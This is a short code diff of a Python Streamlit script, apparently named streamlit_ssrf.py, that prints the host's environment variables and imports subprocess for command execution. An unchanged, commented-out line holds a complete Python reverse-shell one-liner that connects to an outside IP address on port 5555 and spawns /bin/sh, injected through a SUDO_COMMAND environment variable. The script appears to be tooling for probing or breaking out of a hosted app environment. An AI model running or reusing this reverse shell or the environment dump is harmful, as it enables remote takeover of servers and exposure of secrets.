@@ -1,9 +1,11 @@
+from pprint import pprint
+
 import streamlit as st
 import subprocess
 
 import os
 # os.environ['SUDO_COMMAND'] = """/home/adminuser/venv/bin/streamlit run streamlit_ssrf.py && python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"""
-print(os.environ)
+pprint(os.environ)
 
 
 def execute_command(command):
